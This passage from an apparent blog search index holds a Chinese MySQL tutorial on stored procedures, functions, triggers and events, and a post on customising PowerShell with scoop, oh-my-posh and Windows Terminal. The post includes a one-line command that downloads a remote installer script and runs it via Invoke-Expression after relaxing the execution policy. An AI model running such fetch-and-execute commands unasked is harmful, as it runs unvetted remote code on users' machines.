ROUTINE</font></strong>权限。<br>想要查看数据库中哪些存储过程，可以使用 <code>show procedure status</code>命令，要查看具体过程，可以使用 <code>show create procedure 存储过程名</code>命令。</p>\n<h2 id=\"存储过程的调用、删除和修改\"><a href=\"#存储过程的调用、删除和修改\" class=\"headerlink\" title=\"存储过程的调用、删除和修改\"></a><strong>存储过程的调用、删除和修改</strong></h2><h3 id=\"1、存储过程的调用\"><a href=\"#1、存储过程的调用\" class=\"headerlink\" title=\"1、存储过程的调用\"></a>1、存储过程的调用</h3><p>存储过程创建完毕后，可以在程序、触发器或者其他存储过程中被调用，一般使用 <font face=\"宋体\">call</font>语句来调用。</p>\n<p>语法格式：<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CALL</span> 存储过程名 ([参数 ...])</span><br></pre></td></tr></table></figure></p>\n<p>如果要调用某个数据库的存储过程，那么必须先使用这个数据库。</p>\n<h3 id=\"2、存储过程的删除\"><a href=\"#2、存储过程的删除\" class=\"headerlink\" title=\"2、存储过程的删除\"></a>2、存储过程的删除</h3><p>格式<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">PROCEDURE</span> [<span class=\"keyword\">IF</span> <span class=\"keyword\">EXISTS</span>] 存储过程名</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"3、存储过程的修改\"><a href=\"#3、存储过程的修改\" class=\"headerlink\" title=\"3、存储过程的修改\"></a>3、存储过程的修改</h3><p>使用<strong><font face=\"宋体\">alter procedure</font></strong> 可以修改存储过程的部分特征。<br>格式<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">PROCEDURE</span> 存储过程名 [特征...]</span><br></pre></td></tr></table></figure><br>特征<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;contains sql|no sql|reads sql data|modifies sql data&#125;</span><br><span class=\"line\">|sql security &#123;definer|invoker&#125;</span><br><span class=\"line\">|<span class=\"keyword\">comment</span> <span class=\"string\">'string'</span></span><br></pre></td></tr></table></figure></p>\n<p>如果想要修改存储过程的内容，可以采用先删除再重新定义存储过程的方法。</p>\n<h1 id=\"存储函数\"><a href=\"#存储函数\" class=\"headerlink\" title=\"存储函数\"></a><strong>存储函数</strong></h1><p>存储函数和存储过程类似，也是由过程式语句组成的代码片段，但是，也有一些区别：</p>\n<blockquote>\n<p>(1)存储函数不能拥有输出参数，因为存储函数本来就是输出参数<br>(2)不能用CALL语句来调用存储函数<br>(3)存储函数必须包含一条RETURN语句，而存储过程中则不得包含。</p>\n</blockquote>\n<h2 id=\"创建存储函数\"><a href=\"#创建存储函数\" class=\"headerlink\" title=\"创建存储函数\"></a>创建存储函数</h2><p>查看数据库中有哪些存储函数，可以使用命令：<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">show</span> <span class=\"keyword\">function</span> <span class=\"keyword\">status</span></span><br></pre></td></tr></table></figure></p>\n<p>创建存储函数<br>CREATE FUNCTION语法格式<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">FUNCTION</span> 存储过程名 ([参数...])</span><br><span class=\"line\">\t<span class=\"keyword\">RETURNS</span> <span class=\"keyword\">type</span></span><br><span class=\"line\">\t[特征...] 主体</span><br></pre></td></tr></table></figure><br><strong>说明</strong> 存储函数的定义和存储过程相似。</p>\n<blockquote>\n<p>存储函数不能与存储过程同名<br>存储函数的参数只有名称和类型，不能指定IN,OUT,INOUT。RETURNS type声明函数返回值的数据类型。<br>主体也叫存储函数体，与存储过程中使用的一样，但是存储函数体必须包含一个 <code>RETURN value</code>,value为存储函数的返回值。</p>\n</blockquote>\n<p><strong><font face=\"宋体\">example</font></strong><br>该例子返回xs表中学生的数目作为结果</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">delimiter $$</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">function</span> num_of_xs()</span><br><span class=\"line\"><span class=\"keyword\">returns</span> <span class=\"built_in\">integer</span></span><br><span class=\"line\"><span class=\"keyword\">begin</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(*) <span class=\"keyword\">from</span> xs);</span><br><span class=\"line\"><span class=\"keyword\">end</span>$$</span><br><span class=\"line\">delimiter ;</span><br></pre></td></tr></table></figure>\n<h2 id=\"存储函数的调用、删除和修改\"><a href=\"#存储函数的调用、删除和修改\" class=\"headerlink\" title=\"存储函数的调用、删除和修改\"></a><strong>存储函数的调用、删除和修改</strong></h2><h3 id=\"1、存储函数的调用\"><a href=\"#1、存储函数的调用\" class=\"headerlink\" title=\"1、存储函数的调用\"></a>1、存储函数的调用</h3><p>存储函数和MySQL的内置函数(比如version())，所以调用存储函数可以使用 <em>select</em> 关键字。</p>\n<p>语法格式：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> 存储函数名 ([参数[,...]])</span><br></pre></td></tr></table></figure>\n<p>存储函数内部也可以调用另外一个存储函数或存储过程</p>\n<h3 id=\"2、删除存储函数\"><a href=\"#2、删除存储函数\" class=\"headerlink\" title=\"2、删除存储函数\"></a>2、删除存储函数</h3><p>语法格式：<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">FUNCTION</span> [<span class=\"keyword\">IF</span> <span class=\"keyword\">EXISTS</span>] 存储过程名</span><br></pre></td></tr></table></figure></p>\n<p><strong><font face=\"宋体\">example</font></strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">drop</span> <span class=\"keyword\">function</span> <span class=\"keyword\">if</span> <span class=\"keyword\">exists</span> num_of_xs;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3、存储函数的修改\"><a href=\"#3、存储函数的修改\" class=\"headerlink\" title=\"3、存储函数的修改\"></a>3、存储函数的修改</h3><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">FUNCTION</span> 存储过程名 [特征 ...]</span><br></pre></td></tr></table></figure>\n<h1 id=\"触发器\"><a href=\"#触发器\" class=\"headerlink\" title=\"触发器\"></a><strong>触发器</strong></h1><p>触发器不需要被调用，是一个被指定关联到一个表的数据对象，当对一个表的特别事件出现时触发器就会被自动调用。可是实现比如多个表信息的一致性，可通过定义 <em>delete</em> 触发器来实现上述功能。</p>\n<h2 id=\"创建触发器\"><a href=\"#创建触发器\" class=\"headerlink\" title=\"创建触发器\"></a>创建触发器</h2><p>想要查看有哪些触发器使用<strong><font face=\"宋体\">SHOW TRIGGERS</font></strong> 命令。</p>\n<p>CREATE TRIGGER语法格式</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TRIGGER</span> 触发器名 触发时刻 触发事件</span><br><span class=\"line\">\t<span class=\"keyword\">ON</span> 表名 <span class=\"keyword\">FOR</span> <span class=\"keyword\">EACH</span> <span class=\"keyword\">ROW</span> 触发器动作</span><br></pre></td></tr></table></figure>\n<p><strong>说明</strong></p>\n<blockquote>\n<p>触发器名称必须唯一，若要在某个特定数据库中创建，名称前要加上数据库名<br>触发器时刻，有两个选项：<code>after</code>和<code>before</code>，如果想要在激活之后执行一些语句则可以使用after，如果想要进行验证即可以使用before选项。<br>触发器事件：指明了激活触发程序语句的类型。可以是下述值之一<br><strong><font face=\"宋体\">INSERT</font></strong> 将新行插入表时激活触发器，例如通过INSERT、LOAD DATA和REPLACE语句。<br><strong><font face=\"宋体\">UPDATE</font></strong> 更改某一行时激活触发器。例如UPDATE语句。<br><strong><font face=\"宋体\">DELETE</font></strong> 从表中删除某一行时激活触发器。例如，通过DELETE和REPLACE语句。<br>表名：表示在该表上激活触发程序才会激活触发器，同一个表不能拥有两个具有触发时刻和时间的表，触发时间指<em>before</em>和<em>after</em>。<br>FOR EACH ROW：这个声明用来指定对于受触发器事件影响的每一行都要激活触发器的动作。<br>包含触发器激活时将要执行的语句，可使用 <em>begin-end</em> 结构来执行多条语句。</p>\n</blockquote>\n<p>注意：触发器不能返回任何数据到客户端，同样也不能调用将数据返回客户端的存储过程。</p>\n<p><strong><font face=\"宋体\">example</font></strong></p>\n<p>创建一个表，表中只有一列a，在表上创建一个触发器，每次插入操作时，将用户变量str的值设为“trigger is working”。<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> table1(a <span class=\"built_in\">integer</span>);</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">trigger</span> table1_insert <span class=\"keyword\">after</span> <span class=\"keyword\">insert</span></span><br><span class=\"line\">\t<span class=\"keyword\">on</span> table1 <span class=\"keyword\">for</span> <span class=\"keyword\">each</span> <span class=\"keyword\">row</span></span><br><span class=\"line\">\t<span class=\"keyword\">set</span> @<span class=\"keyword\">str</span>=<span class=\"string\">'trigger is working'</span>;</span><br></pre></td></tr></table></figure><br>向table1中插入一行数据<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> table1 <span class=\"keyword\">values</span>(<span class=\"number\">10</span>);</span><br></pre></td></tr></table></figure><br>查看str的值即可查看触发器是否触发。</p>\n<p>MySQL可以关联表中的列，亦可以调用存储过程。在关联表中的列时需要注意：</p>\n<blockquote>\n<p>MySQL可以关联表中的任意列，但不能直接使用列的名称作为标志，那会使系统混淆。必须这样描述才可以：<strong><font face=\"宋体\">NEW.column_name</font></strong> 或者 <strong><font face=\"宋体\">OLD.column_name</font></strong> 。 <strong><font face=\"宋体\">NEW.column_name</font></strong>用来引用新行的一列，<strong><font face=\"宋体\">OLD.column_name</font></strong> 用来引用更新或删除它之前的已有行的一列。<br>对于INSERT语句来说，只有new是合法的，对于DELETE语句，只有OLD才合法，而UPDATE语句可以与OLD和NEW同时使用。</p>\n</blockquote>\n<p><strong><font face=\"宋体\">example</font></strong></p>\n<p>创建一个表实现关联删除的功能</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">delimiter $$</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">trigger</span> xs_delete <span class=\"keyword\">after</span> <span class=\"keyword\">delete</span></span><br><span class=\"line\">\t<span class=\"keyword\">on</span> xs <span class=\"keyword\">for</span> <span class=\"keyword\">each</span> <span class=\"keyword\">row</span></span><br><span class=\"line\"><span class=\"keyword\">begin</span></span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> <span class=\"keyword\">from</span> xs_kc <span class=\"keyword\">where</span> 学号=old.学号；</span><br><span class=\"line\"><span class=\"keyword\">end</span>$$</span><br><span class=\"line\">delimiter ;</span><br></pre></td></tr></table></figure>\n<p>在触发器中也可以调用存储过程。</p>\n<h2 id=\"删除触发器\"><a href=\"#删除触发器\" class=\"headerlink\" title=\"删除触发器\"></a>删除触发器</h2><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">TRIGGER</span> [schema_name.]trigger_name</span><br></pre></td></tr></table></figure>\n<p>schema_name为所在数据库的名称</p>\n<h1 id=\"事件\"><a href=\"#事件\" class=\"headerlink\" title=\"事件\"></a><strong>事件</strong></h1><p>自MySQL5.6之后已经开始支持事件，可能各版本的功能会有所不同，这里是简单的MySQL5.6的版本。<br>事件是MySQL在相应的时刻调用的过程式数据库对象。</p>\n<p>事件的主要作用如下：</p>\n<blockquote>\n<p>关闭账户<br>打开或关闭数据库指示器<br>使数据库中的数据在某个间隔后刷新<br>执行对进入数据的复杂的检查工作。</p>\n</blockquote>\n<h2 id=\"创建事件\"><a href=\"#创建事件\" class=\"headerlink\" title=\"创建事件\"></a>创建事件</h2><p>语法格式：<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">EVENT</span> [<span class=\"keyword\">IF</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">EXISTS</span>] 事件名</span><br><span class=\"line\">\t<span class=\"keyword\">ON</span> SCHEDULE schedule</span><br><span class=\"line\">\t[<span class=\"keyword\">ON</span> COMPLETION [<span class=\"keyword\">NOT</span>] <span class=\"keyword\">PRESERVE</span>]</span><br><span class=\"line\">\t[<span class=\"keyword\">ENABLE</span>|<span class=\"keyword\">DISABLE</span>|<span class=\"keyword\">DISABLE</span> <span class=\"keyword\">ON</span> <span class=\"keyword\">SLAVE</span>]</span><br><span class=\"line\">\t[<span class=\"keyword\">COMMENT</span> <span class=\"string\">'comment'</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">DO</span> <span class=\"keyword\">sql</span>语句；</span><br></pre></td></tr></table></figure><br>schedule：<br><figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">AT timestamp [+INTERVAL interval]</span><br><span class=\"line\">|EVERT interval</span><br><span class=\"line\">[STARTS timestamp [+INTERVAL interval]]</span><br><span class=\"line\">[ENDS timestamp [+INTERVAL interval]]</span><br><span class=\"line\">interval:</span><br><span class=\"line\">count &#123;YEAR|QUARTER|MONTH|DAY|HOUR|MINUTE|WEEK|SECOND|YEAR_MONTH|DAY_HOUR|DAY_MINUTE|DAY_SECOND|HOUR_MINUTE|HOUR_SECOND|MINUTE_SECOND&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>说明：</strong></p>\n<p>schema：时间调度，表示事件何时发生或每隔多久发生一次。<br>AT子句：表示在某个时刻事件发生。timestamp表示一个具体的时间点，后面可以加上一个时间间隔，interval表示这个时间间隔，有一个数字和单位组成，count是间隔时间的数值。<br>EVERY子句：表示在指定时间间隔内每隔多长时间事件发生一次，STARTS子句设定开始时间，ENDS子句设定结束时间。<br>sql语句：时间执行代码，可以使用begin-end结构<br>时间属性：每个事件都可以定义几个属性。<br>ON COMPLETION NOT PRESERVE表示事件最后执行完之后自动删除该事件，不加NOT表示不删除。默认为有not参数</p>\n<p>MySQL事件有事件调度器负责调用，打开事件调度器命令为<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SET</span> <span class=\"keyword\">GLOBAL</span> EVENT_SCHEDULER=<span class=\"literal\">TRUE</span>;</span><br></pre></td></tr></table></figure></p>\n<p><strong><font face=\"宋体\">example</font></strong><br>创建一个30秒后启动的事件</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">use</span> xscj</span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">event</span> afterseconds</span><br><span class=\"line\">\t<span class=\"keyword\">on</span> schedule <span class=\"keyword\">at</span> <span class=\"keyword\">now</span>()+<span class=\"built_in\">interval</span> <span class=\"number\">30</span> <span class=\"keyword\">second</span></span><br><span class=\"line\">\t<span class=\"keyword\">do</span> <span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> xs <span class=\"keyword\">values</span>(<span class=\"string\">'091103'</span>,<span class=\"string\">'张建'</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"修改和删除事件\"><a href=\"#修改和删除事件\" class=\"headerlink\" title=\"修改和删除事件\"></a>修改和删除事件</h2><p>修改事件<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">EVENT</span> event_name</span><br><span class=\"line\">\t[<span class=\"keyword\">ON</span> SCHEDULE schedule]</span><br><span class=\"line\">\t[<span class=\"keyword\">ON</span> COMPLETION [<span class=\"keyword\">NOT</span>] <span class=\"keyword\">PRESERVE</span>]</span><br><span class=\"line\">\t[<span class=\"keyword\">RENAME</span> <span class=\"keyword\">TO</span> new_event_name]</span><br><span class=\"line\">\t[<span class=\"keyword\">ENABLE</span>|<span class=\"keyword\">DISABLE</span>|<span class=\"keyword\">DISABLE</span> <span class=\"keyword\">ON</span> <span class=\"keyword\">SLAVE</span>]</span><br></pre></td></tr></table></figure></p>\n<p>删除事件<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">EVENT</span> [<span class=\"keyword\">IF</span> <span class=\"keyword\">EXISTS</span>] [<span class=\"keyword\">database</span> name.] <span class=\"keyword\">event</span> <span class=\"keyword\">name</span></span><br></pre></td></tr></table></figure></p>\n","categories":["资料"],"tags":["SQL"]},{"title":"oh-my-posh美化PowerShell","url":"/2020/03/22/psbeautify/","content":"<p>爱美之心，人皆有之</p>\n<a id=\"more\"></a>\n<p>Windows下的shell真的是丑出天际，字体也非常别扭，之前用的cmder，刚开始相比cmd的话，确实是美观多了，不过使用了一段时间之后又觉得很丑了，而且cmder实现原理在于把一些常用的linux命令在windows下编译为可执行文件，这样就导致一定的命令延迟，这让我觉得莫名的别扭（好吧，我就是审美奇葩），在加上最近准备把powershell作为主力shell，而默认的PowerShell比CMD还要感人，需要进行一下美化</p>\n<p>oh-my-posh是windows下的主题工具，借鉴于linux下的oh-my-zsh，我此次就是利用该工具来美化PS</p>\n<h1 id=\"安装包管理器\"><a href=\"#安装包管理器\" class=\"headerlink\" title=\"安装包管理器\"></a>安装包管理器</h1><p><code>scoop</code>是Windows下一款非常好用的包管理工具，能够自动设置环境变量，类似于linux下的apt等包管理工具，官网<a href=\"https://scoop.sh/\" target=\"_blank\" rel=\"noopener\">Click Here</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Set-ExecutionPolicy RemoteSigned -scope CurrentUser # 设置powershell执行策略</span><br><span class=\"line\">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;get.scoop.sh&#39;) # 安装scoop</span><br></pre></td></tr></table></figure>\n<p>安装完成后，输入<code>scoop</code>，如下所示即说明安装成功</p>\n<p><img src=\"/2020/03/22/psbeautify/1.png\" alt></p>\n<p>安装git与posh-git</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">scoop install -g git</span><br><span class=\"line\">scoop bucket add extras</span><br><span class=\"line\">scoop install posh-git</span><br></pre></td></tr></table></figure>\n<p>安装oh-my-posh</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">scoop install oh-my-posh</span><br></pre></td></tr></table></figure>\n<p>安装过程中如果出现超时错误的话请扶墙</p>\n<h1 id=\"安装字体\"><a href=\"#安装字体\" class=\"headerlink\" title=\"安装字体\"></a>安装字体</h1><p>中文环境下，默认的ps字体不仅不美观，而且很多特殊字符也不支持，这会导致后面修改主题时看不到效果，出现乱码，而powershell的字体要求非常高，一般的字体无法在原生的ps终端使用，根据其它大佬的测试，<code>Sarasa Gothic</code>字体是符合ps的苛刻要求的，<a href=\"https://github.com/be5invis/Sarasa-Gothic/releases\" target=\"_blank\" rel=\"noopener\">Github地址</a></p>\n<p><strong>安装powerline字体</strong></p>\n<p>除了上述字体之外，还可以安装powerline系列字体，能够很好的适配，Github地址<a href=\"https://github.com/powerline/fonts\" target=\"_blank\" rel=\"noopener\">在这</a><br>下载之后选择自己喜欢的字体安装，也可以运行<code>install.ps1</code>全部安装</p>\n<h1 id=\"启用oh-my-posh\"><a href=\"#启用oh-my-posh\" class=\"headerlink\" title=\"启用oh-my-posh\"></a>启用oh-my-posh</h1><p>接下来需要编写配置文件，才能够让配置每次自动生效，配置路径在<code>$profile</code>中，我们可以输入该变量查看配置文件位置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">➜ $profile</span><br><span class=\"line\">C:\\Users\\Snow\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1</span><br></pre></td></tr></table></figure>\n<p>配置文件内容如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Import-Module DirColors</span><br><span class=\"line\">Import-Module Posh-git</span><br><span class=\"line\">Import-Module oh-my-posh</span><br></pre></td></tr></table></figure>\n<p><code>DirColors</code>是一个对输出进行着色的模块</p>\n<p><strong>配置主题：</strong><br>oh-my-posh内置多个主题，使用<code>Set-Theme</code>命令可以预览主题，TAB键可以切换不同的主题，我个人比较喜欢<code>Honukai</code>主题<br>在修改主题后，需要将改动写入配置文件<code>$profile</code>中，否则下次启动就还是原主题，在配置文件中加一行内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Set-Theme Honukai</span><br></pre></td></tr></table></figure>\n<p><strong>修改配置：</strong></p>\n<p>输入<code>$ThemeSettings</code>可以查看当前设置</p>\n<p>修改用户名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ThemeSettings.CurrentUser &#x3D; &#39;aesm1p&#39;</span><br></pre></td></tr></table></figure>\n<p>如果想要永久生效需要将上述命令写入配置文件<code>$profile</code></p>\n<h1 id=\"第三方终端\"><a href=\"#第三方终端\" class=\"headerlink\" title=\"第三方终端\"></a>第三方终端</h1><p>在按照上述方法配置之后，PS就能够使用了。不过，虽然原生PS运行效率高，速度快，可由于PS太过底层，导致颜值控们进行美化修改时存在诸多限制，比如字体，上文提到的能在原生ps下使用的字体寥寥无几，选择空间有限，而且界面配色，背景等设置在PS中也非常困难，而通过第三方终端可以很方便的进行设置美化</p>\n<h2 id=\"Windows-Terminal\"><a href=\"#Windows-Terminal\" class=\"headerlink\" title=\"Windows Terminal\"></a>Windows Terminal</h2><p>个人最推荐的一款，微软爸爸官方开源，维护很及时，而且字体的锯齿消除做的是最好的，而且官方应用优化也是更加的独到，缺点是目前配置主要使用json文件来配置，没有gui界面，对小白不太友好，不过WindowsTerminal有完善的官方文档指导还是很贴心的。<br>安装该软件需要windows10版本为1903以上，可以通过Microsoft Store安装，也可以在github下载安装，通过store安装的话能够自动更新，手动安装无法自动获取更新。<br>安装完成之后进入软件打开设置<code>settings.json</code>，设置文件结构为：<br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"theme\"</span>: <span class=\"string\">\"light\"</span>, <span class=\"comment\">//主题有light,dark,system三种</span></span><br><span class=\"line\">  <span class=\"attr\">\"profiles\"</span>: <span class=\"comment\">//配置选项</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"defaults\"</span>:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">//此处添加全局配置</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"attr\">\"list\"</span>:</span><br><span class=\"line\">    [</span><br><span class=\"line\">      <span class=\"comment\">//单独配置</span></span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">\"schemes\"</span>: <span class=\"comment\">//配色方案，以列表形式存储</span></span><br><span class=\"line\">  [</span><br><span class=\"line\">    &#123;&#125;,<span class=\"comment\">//scheme</span></span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"attr\">\"keybindings\"</span>:<span class=\"comment\">//绑定快捷键，具体可修改的快捷键参数可以查阅官方文档</span></span><br><span class=\"line\">  [</span><br><span class=\"line\">    &#123;&#125;,</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>了解清楚配置文件结构之后添加相应的配置参数即可，主要是字体大小，配色方案，键绑定等，这里贴上我的配置方案<br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// This file was initially generated by Windows 终端(未打包) 1.2.200825001-release1.2</span></span><br><span class=\"line\"><span class=\"comment\">// It should still be usable in newer versions, but newer versions might have additional</span></span><br><span class=\"line\"><span class=\"comment\">// settings, help text, or changes that you will not see unless you clear this file</span></span><br><span class=\"line\"><span class=\"comment\">// and let us generate a new one for you.</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// To view the default settings, hold \"alt\" while clicking on the \"Settings\" button.</span></span><br><span class=\"line\"><span class=\"comment\">// For documentation on these settings, see: https://aka.ms/terminal-documentation</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"$schema\"</span>: <span class=\"string\">\"https://aka.ms/terminal-profiles-schema\"</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// \"defaultProfile\": \"&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;\",</span></span><br><span class=\"line\">    <span class=\"attr\">\"theme\"</span>: <span class=\"string\">\"light\"</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// You can add more global application settings here.</span></span><br><span class=\"line\">    <span class=\"comment\">// To learn more about global settings, visit https://aka.ms/terminal-global-settings</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// If enabled, selections are automatically copied to your clipboard.</span></span><br><span class=\"line\">    <span class=\"attr\">\"copyOnSelect\"</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// If enabled, formatted data is also copied to your clipboard</span></span><br><span class=\"line\">    <span class=\"attr\">\"copyFormatting\"</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// A profile specifies a command to execute paired with information about how it should look and feel.</span></span><br><span class=\"line\">    <span class=\"comment\">// Each one of them will appear in the 'New Tab' dropdown,</span></span><br><span class=\"line\">    <span class=\"comment\">//   and can be invoked from the commandline with `wt.exe -p xxx`</span></span><br><span class=\"line\">    <span class=\"comment\">// To learn more about profiles, visit https://aka.ms/terminal-profile-settings</span></span><br><span class=\"line\">    <span class=\"attr\">\"profiles\"</span>:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"defaults\"</span>:</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Put settings here that you want to apply to all profiles.</span></span><br><span class=\"line\">            <span class=\"attr\">\"name\"</span>:<span class=\"string\">\"PowerShell\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"source\"</span>: <span class=\"string\">\"Windows.Terminal.PowershellCore\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"colorScheme\"</span>: <span class=\"string\">\"One Half Dark\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"cursorColor\"</span>:<span class=\"string\">\"#FFFFFF\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"fontFace\"</span>:<span class=\"string\">\"Meslo LG M for Powerline\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"fontSize\"</span>:<span class=\"number\">10</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"cursorShape\"</span>:<span class=\"string\">\"filledBox\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"startingDirectory\"</span>:<span class=\"string\">\"your dir\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"backgroundImage\"</span> : <span class=\"string\">\"image path\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"backgroundImageOpacity\"</span>: <span class=\"number\">0.3</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">\"list\"</span>:</span><br><span class=\"line\">        [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"comment\">// Make changes here to the powershell.exe profile.</span></span><br><span class=\"line\">                <span class=\"attr\">\"guid\"</span>: <span class=\"string\">\"&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"Windows PowerShell\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"commandline\"</span>: <span class=\"string\">\"powershell.exe\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"hidden\"</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"comment\">// Make changes here to the cmd.exe profile.</span></span><br><span class=\"line\">                <span class=\"attr\">\"guid\"</span>: <span class=\"string\">\"&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"命令提示符\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"commandline\"</span>: <span class=\"string\">\"cmd.exe\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"hidden\"</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            <span class=\"comment\">// &#123;</span></span><br><span class=\"line\">            <span class=\"comment\">//     \"guid\": \"&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;\",</span></span><br><span class=\"line\">            <span class=\"comment\">//     \"hidden\": false,</span></span><br><span class=\"line\">            <span class=\"comment\">//     \"name\": \"Azure Cloud Shell\",</span></span><br><span class=\"line\">            <span class=\"comment\">//     \"source\": \"Windows.Terminal.Azure\"</span></span><br><span class=\"line\">            <span class=\"comment\">// &#125;</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"attr\">\"guid\"</span>: <span 